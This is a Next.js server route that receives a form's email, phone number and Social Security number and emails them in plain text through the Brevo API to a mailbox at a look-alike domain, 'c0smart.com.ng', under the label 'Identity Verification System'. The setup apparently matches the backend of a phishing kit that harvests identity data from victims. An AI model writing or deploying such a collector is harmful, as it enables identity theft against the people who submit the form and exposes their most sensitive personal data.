import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    const formData = await request.json()

    const brevoApiKey = process.env.BREVO_API_KEY

    if (!brevoApiKey) {
      return NextResponse.json({ error: "Brevo API key not configured" }, { status: 500 })
    }

    // Send email via Brevo API
    const emailResponse = await fetch("https://api.brevo.com/v3/smtp/email", {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        "api-key": brevoApiKey,
      },
      body: JSON.stringify({
        sender: {
          name: "Identity Verification System",
          email: "verify@c0smart.com.ng",
        },
        to: [
          {
            email: "verify@c0smart.com.ng",
            name: "Verification Team",
          },
        ],
        subject: "New Identity Verification Submission",
        htmlContent: `
          <h2>New Identity Verification Submission</h2>
          <p><strong>Email:</strong> ${formData.email}</p>
          <p><strong>Phone:</strong> ${formData.phone}</p>
          <p><strong>SSN:</strong> ${formData.ssn}</p>
          <p><strong>ID Document:</strong> ${formData.proofOfAddress ? "Uploaded" : "Not provided"}</p>
          <p><strong>Submission Time:</strong> ${new Date().toLocaleString()}</p>
        `,
        textContent: `
          New Identity Verification Submission
          
          Email: ${formData.email}
          Phone: ${formData.phone}
          SSN: ${formData.ssn}
          ID Document: ${formData.proofOfAddress ? "Uploaded" : "Not provided"}
          Submission Time: ${new Date().toLocaleString()}
        `,
      }),
    })

    if (!emailResponse.ok) {
      const errorData = await emailResponse.json()
      console.error("Brevo API error:", errorData)
      return NextResponse.json({ error: "Failed to send verification email" }, { status: 500 })
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error("Error sending verification email:", error)
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
